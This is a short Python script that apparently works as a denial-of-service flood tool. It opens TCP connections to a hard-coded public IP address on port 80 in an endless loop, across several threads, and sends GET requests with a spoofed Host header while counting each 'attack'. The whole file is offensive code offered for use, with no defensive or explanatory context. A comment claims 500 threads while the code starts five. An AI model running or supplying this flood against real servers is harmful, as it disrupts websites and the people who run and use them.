import socket
import threading

target = '172.67.130.8' #public ip of website
fake_ip = '198.49.23.145' #must be a valid ip
port = 80 #can be other ports

attack_num = 0

def attack():
    while True:
        website = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        website.connect((target, port))
        website.sendto(("GET /" + target + " HTTP/1.1\r\n").encode('ascii'), (target, port))
        website.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), (target, port))

        global attack_num
        attack_num += 1
        print(f"Attack Number: {attack_num}")

        website.close()


for i in range(5): # starts 500 threads 
    print(f"Thread {i}")
    thread = threading.Thread(target=attack)
    thread.start()